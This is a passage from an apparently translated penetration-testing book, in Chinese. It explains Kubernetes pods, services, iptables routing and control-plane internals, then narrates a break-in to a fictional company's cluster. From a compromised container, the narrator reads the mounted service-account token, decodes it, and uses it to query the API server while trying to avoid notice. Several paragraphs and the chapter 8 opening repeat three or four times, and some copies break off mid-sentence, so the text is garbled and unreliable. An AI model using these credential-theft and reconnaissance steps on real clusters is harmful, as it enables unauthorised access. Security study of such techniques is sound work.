![](img/961e81aef23040d0fbe348f58c055860_130_0.png)

图 7-1：由 Nginx 和 Redis 容器组成的 Pod

在清单 7-1 中，我们创建一个清单文件，为由两个容器组成的 Pod 打上标签 `app: myapp`：一个在 8080 端口监听的 Nginx 服务器和一个在 6379 端口可用的 Redis 数据库。以下是描述此设置的 YAML 语法：

```
#### myapp.yaml file

#### Minimal description to start a pod with 2 containers

apiVersion: v1

kind: Pod  # We want to deploy a pod

metadata:

  name: myapp  # Name of the pod

  labels:

    app: myapp  # Label used to search/select the pod

spec:

  containers:

    - name: nginx   # First container

      image: sparcflow/nginx  # Name of the public image

      ports:

        - containerPort: 8080  # Listen on the pod's IP address

    - name: mydb    # Second container

      image: redis  # Name of the public image

      ports:

        - containerPort: 6379
```



### 清单 7-1：创建包含两个容器的 Pod 的清单文件

我们使用 `kubectl` 工具发送此清单，这是用于与 Kubernetes 集群交互的旗舰程序。您需要从 `https://kubernetes.io/docs/tasks/tools/install-kubectl/` 下载 `kubectl`。

我们更新 `kubectl` 配置文件 `~/.kube/config` 以指向我们的集群（稍后会详细介绍），然后提交清单 7-1 中的清单文件：

```
root@DemLab:/# kubectl apply -f myapp.yaml

root@DemLab:/# kubectl get pods
```

| 名称 | 就绪 | 状态 | 重启次数 | 年龄 |
|------|-------|--------|----------|-----|
| myapp | 2/2 | 运行中 | 0 | 1m23s |

我们的 Pod 现在已成功在集群中的 100 台机器之一上运行。同一 Pod 中的容器被视为一个整体，因此 Kube 使它们共享相同的卷和网络命名空间。结果是我们的 Nginx 和数据库容器具有相同的 IP 地址（`10.0.2.3`），该地址取自网络桥接 IP 池（请参阅第 119 页的“资源”以获取更多信息），并且可以使用其命名空间隔离的 `localhost`（`127.0.0.1`）地址相互通信，如图 7-2 所示。非常方便。

> NOTE
> 实际上，Kubernetes 在 Pod 内还会生成一个名为 `pause-container` 的第三个容器。该容器拥有网络和卷命名空间并与 Pod 中其余容器共享（有关更多信息，请参阅 `https://www.ianlewis.org/`）。

![](img/961e81aef23040d0fbe348f58c055860_131_0.png)

![](img/961e81aef23040d0fbe348f58c055860_131_1.png)

图 7-2：Pod、容器和主机机器（节点）的网络配置

每个 Pod 都有一个 IP 地址，运行在称为节点 `node` 的虚拟或裸机上。我们集群中的每台机器都是一个节点，因此集群有 100 个节点。每个节点都托管一个 Linux 发行版，并带有一些特殊的 Kubernetes 工具和程序以与集群的其余部分同步。

一个 Pod 很不错，但两个更好，尤其是在为弹性方面考虑，以便第二个可以在第一个失败时充当备份。我们该怎么办？提交两次相同的清单？不，我们创建一个可以复制 Pod 的部署对象，如图 7-3 所示。

![](img/961e81aef23040d0fbe348f58c055860_132_0.png)

图 7-3：Kube 部署对象

部署描述了在任何给定时间应该运行多少个 Pod，并监督复制策略。它会在 Pod 宕机时自动重新生成 Pod，但其关键特性是滚动更新。例如，如果我们决定更新容器的镜像并因此提交更新的部署清单，它将以战略方式替换 Pod，从而保证更新过程中应用程序的持续可用性。如果出现任何问题，新部署将回滚到期望状态的先前版本。

让我们删除之前的独立 Pod，以便我们可以将其重新创建为部署对象的一部分：

```
root@DemoLab:/# kubectl delete -f myapp.yaml
```

要将 Pod 作为部署对象创建，我们推送一个类型为 `Deployment` 的新清单文件，指定要复制的容器的标签，并在其清单文件中附加之前 Pod 的配置（见清单 7-2）。Pod 通常都是作为部署资源的一部分创建的。

```
#### deployment_myapp.yaml file

#### Minimal description to start 2 pods

apiVersion: apps/v1

kind: Deployment # We push a deployment object

metadata:

  name: myapp # Deployment’s name

spec:

  selector:

    matchLabels: # The label of the pods to manage

      app: myapp

  replicas: 2 # Tells deployment to run 2 pods

  template: # Below is the classic definition of a pod

    metadata:

      labels:

        app: myapp # Label of the pod

    spec:

containers:

  - name: nginx  # First container

    image: sparcflow/nginx

    ports:

      - containerPort: 8080

  - name: mydb  # Second container

    image: redis

    ports:

      - containerPort: 6379
```

清单 7-2：将我们的 Pod 重新创建为部署对象

现在我们提交清单文件并检查新的部署 Pod 的详细信息：

```
root@DemLab:~# kubectl apply -f deployment_myapp.yaml

deployment.apps/myapp created

root@DemLab:~# kubectl get pods
```

| 名称 | 就绪 | 状态 | 重启次数 | 年龄 |
|------|-------|--------|----------|-----|
| myapp-7db4f7-btm6s | 2/2 | 运行中 | 0 | 1m38s |
| myapp-9dc4ea-ltd3s | 2/2 | 运行中 | 0 | 1m43s |

图 7-4 显示了这两个正在运行的 Pod。

![](img/961e81aef23040d0fbe348f58c055860_133_0.png)

图 7-4：两个正在运行的 Pod，每个由两个容器组成

同一 Kubernetes 集群中的所有 Pod 和节点都可以自由相互通信，而无需使用网络地址转换 `NAT` 等伪装技术。这种自由通信是 Kubernetes 的一个定义性网络特性。我们在机器 B 上的 Pod A 应该能够通过机器/路由器/子网/VPC 级别定义的正常路由到达机器 D 上的 Pod C。这些路由由设置 Kube 集群的工具自动创建。

#### 流量平衡

现在我们想要平衡到这两个 Pod 的流量。如果其中一个宕机，数据包应自动路由到剩余的 Pod，同时生成一个新的 Pod。描述此配置的对象称为服务，如图 7-5 所示。

![](img/961e81aef23040d0fbe348f58c055860_134_0.png)

图 7-5：集群服务对象

服务的清单文件由添加标签到此服务的元数据及其路由规则组成，路由规则说明要定位哪些 Pod 以及要监听哪个端口（见清单 7-3）。

```
#### myservice.yaml file

#### Minimal description to start a service

apiVersion: v1

kind: Service # We are creating a service

metadata:

    name: myapp

    labels:

        app: myapp  # The service's tag

spec:

    selector:

        app: myapp # Target pods with the selector "app:myapp"

    ports:

    - protocol: TCP

      port: 80 # Service listens on port 80

      targetPort: 8080 # Forward traffic from port 80 to port 8080 on the pod
```

清单 7-3：服务清单文件

我们随后提交此清单文件以创建服务，我们的服务会被分配一个只能从集群内部访问的集群 IP：

```
root@DemLab:/# kubectl apply -f service_myapp.yaml

service/myapp created

root@DemLab:/# kubectl get svc myapp
```



| 名称 | 类型 | 集群 IP | 外部 IP | 端口 |
|------|------|------------|-------------|---------|
| myapp | ClusterIP | 10.100.166.225 | <none> | 80/TCP |

另一台机器上的 Pod 如果想与我们的 Nginx 服务器通信，将向该集群 IP 的 80 端口发送请求，然后流量将被转发到两个容器之一的 8080 端口。

让我们快速使用 Docker 公共镜像 `curlimages/curl` 启动一个临时容器来测试此设置并 ping 集群 IP：

```
root@DemLab:/# kubectl run -it --rm --image curlimages/curl mycurl -- sh

/$ curl 10.100.166.225

<h1>Listening on port 8080</h1>
```

很好，我们可以在集群内部访问 Nginx 容器。跟得上吗？太好了。

### 打开应用面向世界

直到目前为止，我们的应用对外部世界仍然是封闭的。只有内部的 Pod 和节点才知道如何联系集群 IP 或直接访问 Pod。我们位于不同网络上的计算机没有必要的路由信息来访问我们刚刚创建的任何资源。本次速成教程的最后一步是使用 NodePort 使此服务可以从外部世界调用。该对象在集群的每个节点上公开一个端口，该端口会随机指向我们创建的两个 Pod 之一（我们稍后会更详细地介绍这一点）。我们即使在外部访问时也保留了弹性功能。

我们将 `type: NodePort` 添加到清单文件中的上一个服务定义中：

```yaml
apiVersion: v1
--snip--
  selector:
    app: myapp # Target pods with the selector "app:myapp"
  type: NodePort
  ports:
--snip--
```

然后我们再次重新提交服务清单：

```bash
root@DemLab:/# kubectl apply -f service_myapp.yaml
service/myapp configured
root@DemLab:/# kubectl get svc myapp
NAME      TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)
myapp     NodePort   10.100.166.225   <none>        80:31357/TCP
```

对任何节点的外部 IP 在 31357 端口的任何请求都将随机到达两个 Nginx Pod 之一。这里有一个快速测试：

```bash
root@AnotherMachine:/# curl 54.229.80.211:31357
<h1>Listening on port 8080</h1>
```

呼……全部完成。我们也可以通过创建负载均衡器来添加另一层网络，以公开更常见的端口如 443 和 80，将流量路由到此节点端口，但现在我们就先到这里吧。

### Kube 内部原理

我们有一个弹性、松散负载均衡的容器化应用在某处运行。现在到了有趣的部分。让我们解构刚刚发生的事情，并揭开每个在线教程似乎都急于掩盖的肮脏秘密。

当我第一次开始玩 Kubernetes 时，创建服务时得到的那个集群 IP 地址让我很困扰。非常困扰。它是从哪里来的？节点的子网是 192.168.0.0/16。容器在自己的 10.0.0.0/16 池中游动。那该死的 IP 是从哪里来的？

我们可以列出集群中每个节点的每个接口，却永远找不到那个 IP 地址。因为它不存在。字面意义上不存在。它只是一个 iptables 目标规则。该规则被推送到所有节点，并指示它们将所有针对这个不存在的 IP 的请求转发到我们创建的两个 Pod 之一。就这样。这就是服务对象——由一个名为 `kube-proxy` 的组件编排的一堆 iptables 规则。

`Kube-proxy` 也是一个 Pod，但确实非常特殊。它在集群的每个节点上运行，秘密地编排网络流量。尽管名字如此，它实际上并不转发数据包，至少在最近的版本中不是这样。它静默地在所有节点上创建和更新 iptables 规则，以确保网络数据包到达目的地。

当数据包到达（或尝试离开）节点时，它会自动被发送到 `KUBE-SERVICES` iptables 链，我们可以使用 `iptables-save` 命令来探索它：

```
root@KubeNode:/# iptables-save
-A PREROUTING -m comment --comment "kube" -j KUBE-SERVICES
--snip--
```

该链尝试根据数据包的目的 IP 和端口（`-d` 和 `--dport` 标志）将其与多个规则进行匹配：

```
--snip--
-A KUBE-SERVICES -d 10.100.172.183/32 -p tcp -m tcp --dport 80 -j KUBE-SVC-NPJI
```

瞧，我们的调皮集群 IP！发送到 10.100.172.183 地址的任何数据包都会被转发到链 `KUBE-SVC-NPJI`，该链在几行之后定义：

```
--snip--
-A KUBE-SVC-NPJI -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-GEGI
-A KUBE-SVC-NPJI -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-VUBW
```

该链中的每个规则都会随机匹配数据包 50% 的时间，并将其转发到不同的链，最终将数据包发送到正在运行的两个 Pod 之一。服务对象的弹性不过是 iptables `statistic` 模块的体现：

```
--snip--
-A KUBE-SEP-GEGI -p tcp -m tcp -j DNAT --to-destination 192.168.127.78:8080
-A KUBE-SEP-VUBW -p tcp -m tcp -j DNAT --to-destination 192.168.155.71:8080
```

发送到节点端口的数据包将遵循相同的处理链，只是它无法匹配任何集群 IP 规则，因此会自动转发到 `KUBE-NODEPORTS` 链。如果目标端口匹配预先声明的节点端口，则数据包将被转发到我们之前看到的负载均衡链 `KUBE-SVC-NPJI`，该链会随机将其分发到各个 Pod 中：

```
--snip--
-A KUBE-SERVICES -m comment --comment "last rule in this chain" -m addrtype --dst-type LOCAL -j KUBE-NODEPORTS
-A KUBE-NODEPORTS -p tcp -m tcp --dport 31357 -j KUBE-SVC-NPJI
```

就是这样：一条巧妙的 iptables 规则和网络路由链。

在 Kubernetes 中，每个小任务都由专用组件执行。`Kube-proxy` 负责网络配置。它很特别，因为它作为 Pod 在每个节点上运行，而其余核心组件则在称为 master 节点的选定节点组上的多个 Pod 内运行。

我们在创建 100 台机器的集群时创建的 100 个节点中，那一个 master 节点将托管一组 Pod，构成 Kubernetes 的脊柱：`API server`、`kube-scheduler` 和 `controller manager`（见图 7-6）。

![](img/961e81aef23040d0fbe348f58c055860_137_0.png)

图 7-6：运行在 master 节点上的 Pod 与运行在普通节点上的 Pod

NOTE 在多 master 设置中，我们将有三个或更多副本的每个 Pod，但任何给定时间每个服务的只有一个活动 Pod。

我们实际上在使用 `kubectl apply` 命令发送清单文件时已经与 master 节点交互了。`Kubectl` 是一个包装器，它向至关重要的 `API server` Pod 发送 HTTP 请求，这是检索和持久化集群著名期望状态的主要入口点。以下是可用于访问 Kube 集群的典型配置 `~/kube/config`：

```yaml
apiVersion: v1
kind: Config
clusters:
- cluster:
  certificate-authority: /root/.minikube/ca.crt
  server: https://192.168.99.100:8443
  name: minikube
--snip--
users:
- name: sparc
  user:
    client-certificate: /root/.minikube/client.crt
```



`client-key`: `/root/.minikube/client.key`

--snip--

在本例中，我们的 API server URL 是 `https://192.168.99.100`。这样想：API server 是唯一允许在数据库中读写期望状态的 Pod。想列出 Pod 吗？问 API server。想报告 Pod 故障吗？告诉 API server。它是 Kubernetes 这一复杂交响乐的主要指挥。

当我们通过 `kubectl`（HTTP）将部署文件提交到 API server 时，它进行了一系列检查（身份验证和授权，我们将在第 8 章中介绍），然后将该部署对象写入 `etcd` 数据库，`etcd` 是一个键值数据库，使用 Raft 共识算法在多个节点（或 Pod）之间维护一致且连贯的状态。在 Kube 的情况下，`etcd` 描述了集群的期望状态，例如有多少 Pod、它们的清单文件、服务描述、节点描述等等。

一旦 API server 将部署对象写入 `etcd`，期望状态就正式被更改了。它通知订阅此特定事件的回调处理程序：部署控制器，另一个在 master 节点上运行的组件。

所有 Kube 交互都基于这种事件驱动行为，这反映了 `etcd` 的 watch 功能。API server 接收到通知或操作。它读取或修改 `etcd` 中的期望状态，从而触发发送到相应处理程序的事件。

部署控制器要求 API server 返回新的期望状态，注意到一个部署已被初始化，但找不到它 supposed 管理的 Pod 组的任何引用。它通过创建 ReplicaSet 来解决这种差异，ReplicaSet 是一个描述 Pod 组复制策略的对象。

此操作再次经过 API server，后者再次更新状态。然而这次，事件被发送到 ReplicaSet 控制器，后者进而注意到期望状态（两个 Pod 的一组）与现实（没有 Pod）之间不匹配。它继续创建容器的定义。

这个过程（你猜对了）再次经过 API server，在修改状态后，触发 Pod 创建的回调，该回调由 `kube-scheduler` 监控（在 master 节点上运行的专用 Pod）。

调度器在数据库中看到两个处于挂起状态的 Pod。不可接受。它运行其调度算法以找到适合托管这两个 Pod 的节点，用相应的节点更新 Pod 的描述，并将所有内容提交给 API server 以存储在数据库中。

这个官僚式疯狂的最后一块拼图是 `kubelet`：一个在每个工作节点上运行的进程（不是 pod！），它会定期从 API 服务器拉取它应该运行的 pod 列表。`kubelet` 发现其主机应该再运行两个额外的容器，于是它通过容器运行时（通常是 Docker）启动它们。我们的 pod 最后终于活了过来。复杂？我就说嘛。但不可否认这种同步机制的美妙之处。尽管我们只涵盖了众多可能交互中的一种工作流，请放心，你应该能够跟上关于 Kube 的几乎每篇文章。我们甚至准备好进入下一步——因为，免得你忘了，我们在 MXR Ads 仍有一个真实的集群在等待着我们。

### 资源
- 关于桥接和桥接池的更多细节可在 Docker 文档中找到：`https://docs.docker.com/network/bridge/`。
- 在 Amazon Elastic Kubernetes Service (EKS) 上的 Pod 直接插入 Elastic 网络接口，而不是使用桥接网络；详情请参阅 `https://amzn.to/37Rfj5c`。
- 有关 Kubernetes pod 到 pod 网络的更多信息，请参阅 `http://bit.ly/3a0hJjX`。
- 这是有关从外部访问集群的其他方式的概述：`http://bit.ly/30aGqFU`。
- 有关 `etcd` 的更多信息，请参阅 `http://bit.ly/36MAjKr` 和 `http://bit.ly/2sds4bg`。
- 通过未认证 API 入侵 Kubernetes 的内容可在 `http://bit.ly/36NBk4S` 找到。

## 8
## 肖申克的救赎：越狱

![](img/961e81aef23040d0fbe348f58c055860_141_0.png)

带着对 Kubernetes 的这一新理解，我们回到调查应用程序上的临时远程 shell，以收集信息、提升权限，并希望找到有关用户定位的有趣数据。

我们恢复对 `surveyapp` 容器的早期 shell 访问并查看环境变量：

```
shell> env

KUBERNETES_SERVICE_PORT_HTTPS=443

KUBERNETES_PORT_443_TCP_PORT=443

KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
```

凭借我们的新知识，这些环境变量有了新的含义：`KUBERNETES_PORT_443_TCP` 必须指的是隐藏 API 服务器的集群 IP，即著名的 Kube 编排器。文档指出 API 遵循 OpenAPI 标准，因此我们可以使用臭名昭著的 `curl` 工具来访问默认的 `/api` 路由。`curl` 中的 `-L` 开关会跟随 HTTP 重定向，而 `-k` 开关则忽略 SSL 证书警告。我们在列表 8-1 中尝试一下。

```
shell> curl -Lk https://10.100.0.1/api

message: forbidden: User "system:anonymous" cannot get path "/api",

reason: Forbidden
```

*列表 8-1：尝试访问 API 服务器上的默认 `/api` 路由*

啊，我们被锁在外面了。我们得到的响应并不令人意外。从 1.8 版本开始，Kubernetes 发布了角色基于访问控制（RBAC）的稳定版本，这是一种锁定对 API 服务器的访问以防止未经授权用户



*列表 8-1：尝试访问 API 服务器上的默认 `/api` 路由*

啊，我们被锁在外面了。我们得到的响应并不令人意外。从 1.8 版本开始，Kubernetes 发布了角色基于访问控制（RBAC）的稳定版本，这是一种锁定对 API 服务器的访问以防止未经授权用户

这个官僚式疯狂的最后一块拼图是 `kubelet`：一个在每个工作节点上运行的进程（不是 pod！），它会定期从 API 服务器拉取它应该运行的 pod 列表。`kubelet` 发现其主机应该再运行两个额外的容器，于是它通过容器运行时（通常是 Docker）启动它们。我们的 pod 最后终于活了过来。复杂？我就说嘛。但不可否认这种同步机制的美妙之处。尽管我们只涵盖了众多可能交互中的一种工作流，请放心，你应该能够跟上关于 Kube 的几乎每篇文章。我们甚至准备好进入下一步——因为，免得你忘了，我们在 MXR Ads 仍有一个真实的集群在等待着我们。

### 资源
- 关于桥接和桥接池的更多细节可在 Docker 文档中找到：https://docs.docker.com/network/bridge/
- 在 Amazon Elastic Kubernetes Service (EKS) 上的 Pod 直接插入 Elastic 网络接口，而不是使用桥接网络；详情请参阅 https://amzn.to/37Rfj5c。
- 有关 Kubernetes pod 到 pod 网络的更多信息，请参阅 http://bit.ly/3a0hJjX。
- 这是有关从外部访问集群的其他方式的概述：http://bit.ly/30aGqFU。
- 有关 etcd 的更多信息，请参阅 http://bit.ly/36MAjKr 和 http://bit.ly/2sds4bg。
- 通过未认证 API 入侵 Kubernetes 的内容可在 http://bit.ly/36NBk4S 找到。

## 8
## 肖申克的救赎：越狱

![](img/961e81aef23040d0fbe348f58c055860_141_0.png)

带着对 Kubernetes 的这一新理解，我们回到调查应用程序上的临时远程 shell，以收集信息、提升权限，并希望找到有关用户定位的有趣数据。

我们恢复对 `surveyapp` 容器的早期 shell 访问并查看环境变量：

```
shell> env

KUBERNETES_SERVICE_PORT_HTTPS=443

KUBERNETES_PORT_443_TCP_PORT=443

KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
```

凭借我们的新知识，这些环境变量有了新的含义：`KUBERNETES_PORT_443_TCP` 必须指的是隐藏 API 服务器的集群 IP，即著名的 Kube 编排器。文档指出 API 遵循 OpenAPI 标准，因此我们可以使用臭名昭著的 `curl` 工具来访问默认的 `/api` 路由。`curl` 中的 `-L` 开关会跟随 HTTP 重定向，而 `-k` 开关则忽略 SSL 证书警告。我们在列表 8-1 中尝试一下。

```
shell> curl -Lk https://10.100.0.1/api

message: forbidden: User "system:anonymous" cannot get path "/api",

reason: Forbidden
```

*列表 8-1：尝试访问 API 服务器上的默认 `/api` 路由*



*列表 8-1：尝试访问 API 服务器上的默认 `/api` 路由*

啊，我们被锁在外面了。我们得到的响应并不令人意外。从 1.8 版本开始，Kubernetes 发布了角色基于访问控制（RBAC）的稳定版本，这是一种锁定对 API 服务器的访问以防止未经授权用户的

这个官僚式疯狂的最后一块拼图是 `kubelet`：一个在每个工作节点上运行的进程（不是 pod！），它会定期从 API 服务器拉取它应该运行的 pod 列表。`kubelet` 发现其主机应该再运行两个额外的容器，于是它通过容器运行时（通常是 Docker）启动它们。我们的 pod 最后终于活了过来。复杂？我就说嘛。但不可否认这种同步机制的美妙之处。尽管我们只涵盖了众多可能交互中的一种工作流，请放心，你应该能够跟上关于 Kube 的几乎每篇文章。我们甚至准备好进入下一步——因为，免得你忘了，我们在 MXR Ads 仍有一个真实的集群在等待着我们。

### 资源
- 关于桥接和桥接池的更多细节可在 Docker 文档中找到：https://docs.docker.com/network/bridge/
- 在 Amazon Elastic Kubernetes Service (EKS) 上的 Pod 直接插入 Elastic 网络接口，而不是使用桥接网络；详情请参阅 https://amzn.to/37Rfj5c。
- 有关 Kubernetes pod 到 pod 网络的更多信息，请参阅 http://bit.ly/3a0hJjX。
- 这是有关从外部访问集群的其他方式的概述：http://bit.ly/30aGqFU。
- 有关 etcd 的更多信息，请参阅 http://bit.ly/36MAjKr 和 http://bit.ly/2sds4bg。
- 通过未认证 API 入侵 Kubernetes 的内容可在 http://bit.ly/36NBk4S 找到。

## 8
## 肖申克的救赎：越狱

![](img/961e81aef23040d0fbe348f58c055860_141_0.png)

带着对 Kubernetes 的这一新理解，我们回到调查应用程序上的临时远程 shell，以收集信息、提升权限，并希望找到有关用户定位的有趣数据。

我们恢复对 `surveyapp` 容器的早期 shell 访问并查看环境变量：

```
shell> env

KUBERNETES_SERVICE_PORT_HTTPS=443

KUBERNETES_PORT_443_TCP_PORT=443

KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
```

凭借我们的新知识，这些环境变量有了新的含义：`KUBERNETES_PORT_443_TCP` 必须指的是隐藏 API 服务器的集群 IP，即著名的 Kube 编排器。文档指出 API 遵循 OpenAPI 标准，因此我们可以使用臭名昭著的 `curl` 工具来访问默认的 `/api` 路由。`curl` 中的 `-L` 开关会跟随 HTTP 重定向，而 `-k` 开关则忽略 SSL 证书警告。我们在列表 8-1 中尝试一下。

```
shell> curl -Lk https://10.100.0.1/api

message: forbidden: User "system:anonymous" cannot get path "/api",

reason: Forbidden
```

*列表 8-1：尝试访问 API 服务器上的默认 `/api` 路由*

啊，我们被锁在外面了。我们得到的响应并不令人意外。从 1.8 版本开始，Kubernetes 发布了角色基于访问控制（RBAC）的稳定版本，这是一种锁定对 API 服务器的访问以防止未授权用户的

这个官僚式疯狂的最后一块拼图是 `kubelet`：一个在每个工作节点上运行的进程（不是 pod！），它会定期从 API 服务器拉取应运行的 pod 列表。`kubelet` 发现主机应再运行两个容器，于是通过容器运行时（通常是 Docker）启动它们。我们的 pod 终于活了。复杂？我就说嘛。但这种同步机制的美妙不可否认。尽管只涵盖了众多交互中的一种工作流，请放心，你应能跟上几乎所有关于 Kube 的文章。我们也准备进入下一步——因为别忘了，MXR Ads 仍有一个真实集群在等着我们。

### 资源
- 关于桥接和桥接池的更多细节可在 Docker 文档中找到：https://docs.docker.com/network/bridge/
- 在 Amazon Elastic Kubernetes Service (EKS) 上的 Pod 直接接入 Elastic 网络接口，而非使用桥接网络；详情见 https://amzn.to/37Rfj5c。
- 有关 Kubernetes pod 到 pod 网络，请参阅 http://bit.ly/3a0hJjX。
- 从外部访问集群的其他方式概述：http://bit.ly/30aGqFU。
- 有关 etcd 的更多信息，请参阅 http://bit.ly/36MAjKr 和 http://bit.ly/2sds4bg。
- 通过未认证 API 入侵 Kubernetes 详见 http://bit.ly/36NBk4S。

## 8
## 肖申克的救赎：越狱

![](img/961e81aef23040d0fbe348f58c055860_141_0.png)

带着对 Kubernetes 的新理解，我们回到调查应用上的临时远程 shell，收集信息、提升权限，并希望找到用户定位的有趣数据。

我们恢复对 `surveyapp` 容器的早期 shell 访问并查看环境变量：

```
shell> env

KUBERNETES_SERVICE_PORT_HTTPS=443

KUBERNETES_PORT_443_TCP_PORT=443

KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
```

凭借新知识，这些环境变量有了新含义：`KUBERNETES_PORT_443_TCP` 必须指向隐藏 API 服务器的集群 IP，即著名的 Kube 编排器。文档指出 API 遵循 OpenAPI 标准，可用臭名昭著的 `curl` 工具访问默认 `/api` 路由。`curl` 的 `-L` 开关会跟随 HTTP 重定向，`-k` 开关忽略 SSL 证书警告。我们在列表 8-1 中尝试。

```
shell> curl -Lk https://10.100.0.1/api

message: forbidden: User "system:anonymous" cannot get path "/api",

reason: Forbidden
```

*列表 8-1：尝试访问 API 服务器上的默认 `/api` 路由*

啊，我们被锁在外面了。响应并不意外。从 1.8 版本起，Kubernetes 发布了稳定的角色基于访问控制 RBAC，用于锁定 API 服务器对未授权用户的访问。即使监听在 8080 端口的“不安全”API 也仅限 localhost：

```
shell> curl -L http://10.100.0.1:8080

(timeout)
```

为绕过此限制，我们将更仔细地查看 Kubernetes RBAC 系统。

## Kube 中的 RBAC

Kubernetes RBAC 采用相当标准的实现。管理员可为人工操作员创建用户账户，或可分配给 pod 的服务账户。每个用户或服务账户再绑定到一个角色，该角色对 pod、节点、secret 等资源拥有 get、list、change 等特定权限。主体（用户或服务账户）与角色的关联称为绑定。

> NOTE Kubernetes 中的 `secret` 是存储在 `etcd` 数据库中并受访问控制的敏感数据片段。它提供了一种替代方案，避免在 pod 清单中硬编码密码。`secret` 在运行时通过环境变量或挂载的文件系统注入。

服务账户、角色及其绑定与其它 Kube 资源一样，均定义在存储于 `etcd` 数据库的清单文件中。服务账户的定义类似列表 8-2。

```
# define a service account

apiVersion: v1

kind: ServiceAccount  # deploy a service account

metadata:

  name: metrics-ro  # service account's name

--

# Bind metrics-ro account to cluster admin role

apiVersion: rbac.authorization.k8s.io/v1

kind: ClusterRoleBinding

metadata:

  name: manager-binding # binding's name

subjects:

- kind: ServiceAccount

  name: metrics-ro  # service account's name

  apiGroup: ""

roleRef:

  kind: ClusterRole
```



`name: cluster-admin` # default role with all privileges

`apiGroup: ""`

```
列表 8-2：ClusterRoleBinding 清单文件
```

管理员若想将服务账户分配给普通 pod，可添加单个属性 `serviceAccountName`，如下：

```
apiVersion: v1

kind: Pod  # We want to deploy a Pod

metadata:

--snip--

spec:

  containers:

    serviceAccountName: metrics-ro

    - name: nginx  # First container

--snip--
```

之前我们未提供任何身份验证就访问了 API 服务器，因此被分配了默认的 `system:anonymous` 用户，该用户没有任何权限。这阻止了我们访问 API 服务器。常识会认为，缺少 `serviceAccountName` 属性的容器也会继承相同的匿名账户状态。

这似乎合理，但 Kube 的运作不同。每个没有服务账户的 pod 都会自动分配 `system:serviceaccount:default:default` 账户。注意“anonymous”与“default”的细微差别。Default 看起来比 anonymous 更不危险，更值得信任，甚至在容器内部挂载了身份验证令牌！

我们搜索容器默认挂载的服务账户：

```
shell> mount |grep -i secrets

tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)

shell> cat /run/secrets/kubernetes.io/serviceaccount/token

eyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwnJI5Y2FmZGRi...
```

该账户令牌实际上是一个签名的 JavaScript Object Notation（JSON）字符串，也称为 JSON Web Token（JWT），其中包含标识服务账户的信息。我们可对 JWT 字符串的一部分进行 base64 解码，以确认默认服务账户的身份并获取信息：

```
shell> cat /run/secrets/kubernetes.io/serviceaccount/token \
| cut -d "." -f 2 \
| base64 -d

{
"iss": "kubernetes/serviceaccount",
"kubernetes.io/serviceaccount/namespace": "prod",
"kubernetes.io/serviceaccount/secret.name": "default-token-2mpcg",
"kubernetes.io/serviceaccount/service-account.name": "default",
"kubernetes.io/serviceaccount/service-account.uid": "956f6a5d-0854-11ea-9d5f-06c16d8c2dcc",
"sub": "system:serviceaccount:prod:default"
}
```

JWT 有几个常规字段，也称注册声明：发行者 `iss`，此处为 Kubernetes 服务账户控制器；主题 `sub`，即账户名称；以及命名空间，稍后详述，此处为 `prod`。显然，若不使附加到此 JSON 文件的签名失效，我们无法更改此信息来冒充其他账户。

命名空间是逻辑分区，用于分隔 pod、服务账户、secret 等 Kube 资源组，通常由管理员设置。它是一个软性屏障，允许更细粒度的 RBAC 权限；例如，具有“列出所有 pod”权限的角色仅限于列出其命名空间内的 pod。默认服务账户也依赖命名空间。我们刚检索到的账户规范名称为 `system:serviceaccount:prod:default`。

> NOTE 我将命名空间描述为“软”隔离方案，因为节点不受命名空间约束。管理员始终可要求 `kube-scheduler` 仅将给定命名空间的 pod 分配给具有特定标签或注释的节点，但许多人认为这违背了 Kubernetes 的初衷。此外，集群内部的所有网络流量默认都会被路由，而与命名空间无关。

此令牌给了我们再次查询 API 服务器的机会。我们将文件内容加载到 `TOKEN` 变量中，并重试列表 8-1 中的第一次 HTTP 请求，将 `TOKEN` 变量作为 `Authorization` 头发送：

```
shell> export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)

shell> curl -Lk https://10.100.0.1/api --header "Authorization: Bearer $TOKEN"
```

```
"kind": "APIVersions",
"versions": ["v1"],
"serverAddressByClientCIDRs": [{
"clientCIDR": "0.0.0.0/0",
"serverAddress": "ip-10-0-34-162.eu-west-1.compute.internal:443"
}]
```

哎呀！看起来默认服务账号确实比匿名账号拥有更多权限。我们已经成功在集群内部获取了一个有效的身份。

## Recon 2.0

是时候进行一些侦察了。我们下载了 `https://10.100.0.1/openapi/v2` 端点上可用的 API 规范并探索我们的选项。

我们首先获取集群的 `/version` 端点。如果集群足够旧，可能存在利用公开漏洞提升权限的可能性：

```
shell> curl -Lk https://10.100.0.1/version --header "Authorization: Bearer $TOKEN"

{
  "major": "1",
  "minor": "14+",
  "gitVersion": "v1.14.6-eks-5047ed",
  "buildDate": "2019-08-21T22:32:40Z",
  "goVersion": "go1.12.9",
  --snip--
}
```

MXR Ads 运行的是由 Elastic Kubernetes Service（EKS）支持的 Kubernetes 1.14，EKS 是 AWS 管理的 Kubernetes 版本。在此设置中，AWS 在其自己的主节点池上托管 API 服务器、etcd 和其他控制器，也称为控制平面。客户（本例中为 MXR Ads）仅托管工作节点（数据平面）。

这是一个重要的信息，因为 AWS 的 Kube 版本允许 IAM 角色与服务账号之间建立比自托管版本更强的绑定。如果我们攻破正确的 Pod 并获取令牌，我们不仅可以攻击 Kube 集群，还可以攻击 AWS 资源！

我们继续探索，通过尝试从我们检索到的 OpenAPI 文档中的多个 API 端点。我们尝试 `api/v1/namespaces/default/secrets/`、`api/v1/namespaces/default/serviceaccounts` 以及许多其他对应 Kube 资源的端点，但我们反复被 401 错误消息阻止。如果我们继续这样下去，错误率会引起不必要的注意。幸运的是，有一个名为 `/apis/authorization.k8s.io/v1/selfsubjectaccessreview` 的 Kube API，可以立即告诉我们是否可以在给定对象上执行操作。

